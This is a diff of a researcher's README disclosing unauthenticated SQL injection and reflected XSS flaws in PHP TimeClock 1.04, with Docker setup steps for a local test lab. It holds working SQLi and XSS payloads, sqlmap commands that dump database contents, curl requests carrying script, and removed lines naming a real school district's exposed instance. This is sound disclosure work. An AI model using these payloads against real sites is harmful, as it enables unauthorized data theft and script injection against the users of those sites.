@@ -1,149 +1,123 @@
-# PHP TimeClock Vulnerabilities 
+# PHP Timelock 1.04 SQLi and XSS Vulnerabilities 
 
-This repository contains details on several vulnerabilities I found in the [PHP TimeClock](http://timeclock.sourceforge.net/) application. 
+![](img/reflective-xss.png)
+
+
+> This repository contains details on several vulnerabilities I found in the [PHP TimeClock](http://timeclock.sourceforge.net/) application. PHP Timeclock is a legacy php application created in 2006 and maintained up until 2013. Unfortunately, several production sites still use the application, and can be identified with basic OSINT. The vulnerabilities include, 
+> 1) Unauthenticated Time and Boolean Based SQL Injection (SQLI)
+> 2) Unauthenticated Reflected Cross Site Scripting (XSS)
+> 3) Authenticated Reflected Cross Site Scripting (XSS)  
 
 
 
-# Multiple SQL Injections (Time-Based Blind & Boolean-Based Blind)
+**Index**
+- [PHP Timelock 1.04 SQLi and XSS Vulnerabilities](#php-timelock-104-sqli-and-xss-vulnerabilities)
+  - [Indentified Vulnerabilities](#indentified-vulnerabilities)
+    - [PHP Timeclock 1.04 Time and Boolean Based Blind SQL Injection](#php-timeclock-104-time-and-boolean-based-blind-sql-injection)
+      - [PHP Timeclock 1.04 Multiple Unauthenticated Reflected Cross Site Scripting (XSS)](#php-timeclock-104-multiple-unauthenticated-reflected-cross-site-scripting-xss)
+  - [Local Testing](#local-testing)
+  - [Remote Testing](#remote-testing)
+
+## Indentified Vulnerabilities 
+
+### PHP Timeclock 1.04 Time and Boolean Based Blind SQL Injection  
+
+![](img/sqli.png)
+
+
+Description: PHP Timeclock is vulnerable to both Boolean and Time Based SQL Injection on login.php via the login_userid parameter. This PoC shows how SQLmap can be used to exploit this vulnerability to dump database contents
+
+Boolean Based Payload: user' RLIKE (SELECT (CASE WHEN (8535=8535) THEN 0x75736572 ELSE 0x28 END))-- QwMo&login_password=pass
+Time Based Payload: user' AND (SELECT 4247 FROM (SELECT(SLEEP(5)))ztHm) AND 'WHmv'='WHmv&login_password=pass
+
+
+Steps to reproduce:
+  1. Run sqlmap against a instance of PHP Timeclock
+  2. Follow the instructions below for specific versions of MySQL
+
+
+MySQL >= 5.0.12: 
+```
+$ sqlmap -u http://localhost/login.php --method POST --data "login_userid=user&login_password=pass" -p login_userid --not-string="Warning" --dbms=MySQL --technique=TB --current-db
+---
+Parameter: login_userid (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: login_userid=user' AND (SELECT 4247 FROM (SELECT(SLEEP(5)))ztHm) AND 'WHmv'='WHmv&login_password=pass
+---
+```
+
+MySQL < 5: On versions using MySQL < 5, table names must be included as arguments as information_schema was not introduced into MySQL yet.
 
 ```
+$ sqlmap -u http://localhost/login.php --method POST --data "login_userid=user&login_password=pass" -p login_userid --not-string="Warning" --technique=B -D timeclock -T employees, -C empfullname --dump --dbms=MySQL -v 
+---
 Parameter: login_userid (POST)
     Type: boolean-based blind
     Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
-    Payload: login_userid=foo' RLIKE (SELECT (CASE WHEN (1542=1542) THEN 0x666f6f ELSE 0x28 END))-- QYSb&login_password=pass
+    Payload: login_userid=user' RLIKE (SELECT (CASE WHEN (8535=8535) THEN 0x75736572 ELSE 0x28 END))-- QwMo&login_password=pass
+---
 
-    Type: time-based blind
-    Title: MySQL < 5.0.12 AND time-based blind (heavy query)
-    Payload: login_userid=foo' AND 7130=BENCHMARK(5000000,MD5(0x6c716b4c))-- frgB&login_password=pass
-``` 
+```  
 
+#### PHP Timeclock 1.04 Multiple Unauthenticated Reflected Cross Site Scripting (XSS)
 
-## Reflected Cross-Site Scripting Vulnerabilities via GET request 
 
-Several resources are is vulnerable to reflective cross-site scripting via appending any payload to the end of the URL GET request. The payload should be preceeded with a single quote and greater than symbol. Vulnerable resources include, 
+Description: PHP Timeclock version 1.04 (and prior) suffers from multiple Unauthenticated Reflected Cross-Site Scripting Vulnerabilities. Arbitrary javascript can be injected into the application by appending a termination /'> and payload directly to the end of the GET request URL. The vulnerable paths include (1) /login.php  (2) /timeclock.php (3) /reports/audit.php and (4) /reports/timerpt.php. 
 
-+ /login.php
-+ /timeclock.php
-+ /reports/audit.php
-+ /reports/timerpt.php
 
-```
-curl -i -s -k -X $'GET' \
-    -H $'Host: localhost' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H $'Connection: close' \
-    $'http://localhost/login.php/\'%3E%3Csvg/onload=alert%60xss%60%3E'
-```
+Payload: /'><svg/onload=alert`xss`>
 
-*payload*: http://localhost/login.php/'%3E%3Csvg/onload=alert%60xss%60%3E%3C  
+Example: http://target/login.php/'%3E%3Csvg/onload=alert%60xss%60%3E
 
-![](img/reflective-xss.png)  
+![](img/reflective-xss.png)
 
-## Multiple Cross-Site Scripting via post parameters in /reports/total_hours.php, reports/timerpt.php, and reports/audit.php
+Steps to reproduce:
+  1. Navigate to a site that uses PHP Timeclock 1.04 or earlier
+  2. Make a GET request to one of the four resources mentioned above
+  3. Append /'> and the payload to the end of the request
+  4. Submit the request and observe payload execution
+## Local Testing 
 
+This repository was my attempt at dockerizing the 2006-2013 [PHP TimeClock](http://timeclock.sourceforge.net/) application. It uses an adapted version of [rodvlopes/php4-mysql4-apache2.2-docker](https://github.com/rodvlopes/php4-mysql4-apache2.2-docker) to manage setting up legacy versions of php,mysql, and apache which are required in php timeclock due to several deprecated functions. 
 
-The resources located at /reports/total_hours.php, reports/timerpt.php, and reports/audit.php are vulnerable to cross site scripting in the from_date,to_date post parameters.
 
-![](img/xss-via-total-hours.png)
+It was a bit of a pain to create a test environment for PHP Timeclock due to the fact it requires legacy version of PHP and MySQL. To get version 1.04 up and running without modifying source code, the application requires MySQL 4 and PHP 4. To accomondate this, I created this docker container based on [rodvlopes/php4-mysql4-apache2.2-docker](https://github.com/rodvlopes/php4-mysql4-apache2.2-docker). 
 
-```
-curl -i -s -k -X $'POST' \
-    -H $'Host: localhost' -H $'Content-Length: 242' -H $'Cache-Control: max-age=0' -H $'sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\"' -H $'sec-ch-ua-mobile: ?0' -H $'Upgrade-Insecure-Requests: 1' -H $'Origin: http://localhost' -H $'Content-Type: application/x-www-form-urlencoded' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-User: ?1' -H $'Sec-Fetch-Dest: document' -H $'Referer: http://localhost/reports/total_hours.php' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9' -H $'Connection: close' \
-    -b $'PHPSESSID=deabe86d43dc8a946b4f9a20639bc0ad' \
-    --data-binary $'date_format=M%2Fd%2Fyyyy&office_name=foo&group_name=foo+group&user_name=foo&from_date=5%2F6%2F2021\'><svg/onload=alert`xss`>&to_date=5%2F6%2F2021&csv=0&tmp_paginate=1&tmp_show_details=1&tmp_display_ip=1&tmp_round_time=0&submit.x=23&submit.y=10' \
-    $'http://localhost/reports/total_hours.php'
-```
+1) Clone the repo  
 
+ `git clone https://github.com/tcbutler320/php-timeclock-docker`
 
-# Stored Cross Site Scripting in
+2) cd into the docker folder 
 
-This repository was my attempt at dockerizing the 2006 [PHP TimeClock](http://timeclock.sourceforge.net/) application. It uses an adapted version of [rodvlopes/php4-mysql4-apache2.2-docker](https://github.com/rodvlopes/php4-mysql4-apache2.2-docker) to manage setting up legacy versions of php,mysql, and apache which are required in php timeclock due to several deprecated functions. 
+`cd php-timeclock-docker/docker`
 
+3) build docker image 
 
-## Installation   
+`docker build -f Dockerfile.ubuntu -t timeclock .`
 
-1) Clone the repo   `git clone https://github.com/tcbutler320/php-timeclock-docker`
-2) cd into the docker folder `cd php-timeclock-docker/docker`
-3) build docker image `docker build -f Dockerfile.ubuntu -t timeclock .`
-4) Run the image `docker run -d --name timeclock --restart=always -p 80:80 -v ./data:/usr/local/mysql/var -v ./timeclock-1.04:/usr/local/apache2/htdocs timeclock`
+4) Run the image 
 
-> For now, the rest of the instructions will only be for Docker Desktop. I'll later script this out in the docker build so that it can be done automatically 
+`docker run -d --name timeclock --restart=always -p 80:80 -v ./data:/usr/local/mysql/var -v ./timeclock-1.04:/usr/local/apache2/htdocs timeclock`
 
-5) Using docker desktop, open the cli for the container 
-6) open a mysql shell `mysql -u root -p`, using password IAmroot
-7) create the timeclock database `create database timeclock;`
-8) exit the mysql shell
-9) populate the database with the sql file `mysql -u root -p timeclock < /usr/local/apache2/htdocs/create_tables.sql`
+5) Drop into the container with bash  
 
+`sudo docker exec -it timeclock /bin/bash  ` 
 
+6) open a mysql shell 
 
-## Resources 
-southcentralunified
+`mysql -u root -p`, using password IAmroot
 
-http://timeclock.southcentralunified.org/timeclock.php
+7) create the timeclock database 
 
+`create database timeclock;`
 
-## Vulnerability Disovered
+8)  exit the mysql shell
+   
+9)  populate the database with the sql file 
 
-The southcentralunified school district is using an externally facing employee timeclock application, running a decades old PHP version (3.3) and a time management software last updated in 2006 (php-timeclock). 
+`mysql -u root -p timeclock < /usr/local/apache2/htdocs/create_tables.sql`
 
+## Remote Testing   
 
-
-
-## Set up Test Enviorment 
-
-https://www.linuxquestions.org/questions/programming-9/error-compiling-php-5-2-i-know-very-old-dereferencing-pointer-to-incomplete-type-4175462232/
-
-
-
-### Server Setup 
-
-1) wget -c http://museum.php.net/php5/php-5.3.3.tar.gz
-2) gunzip php-5.3.3.tar.gz
-3) tar -xvf php-5.3.3.tar
-4) cd php-5.3.3/
-5) apt-get install build-essential
-6) sudo apt-get install libxml2-dev
-7) ./configure --prefix=$HOME/local
-8) make
-9) make install
-
-
-
-## Dockerizing the PHP TimeClock Application 
-
-> Several issues arose when trying to launch a test enviorment due to the extremly old versions of php and mysql that were last tested on the application. To get around this, a few modifications must be made 
-
-
-## MySQL 
-
-1) Changing the MySQL table structure
-
-The MySQL table defined in the original create_tables.sql file uses several table and column names with 'group'. This has become a reserved name in MySQL, and therefore all instances of group must be changed to grp in order to import into the MySQL server
-
-2) The earliest dockerized version of MySQL only allows `bigint` with precision up to 6, so this must be changed from the original 14   
-
-`#1426 - Too-big precision 14 specified for 'timestamp'. Maximum is 6.`
-
-
-
-
-## PHP
-
-
-1) Changing the PHP mysqli_connect function call 
-
-The original 1.03 application uses the mysqli_connect function to communicate to the database. Unfortunately, this was depricated in PHP 5.5.5, and the earliest version of PHP which is dockerized is 5.7. To get around this, we must change the sql function to mysql_connnect. 
-
-
-
-
-## options 
-
-https://github.com/rodvlopes/php4-mysql4-apache2.2-docker
-
-
-
-
-
-## Installing PHP From Source, Solved 
-
-> https://forums.centos.org/viewtopic.php?t=53046
+Upon request I will open a remote server for testing, drop me message on twitter @tbutler0x90
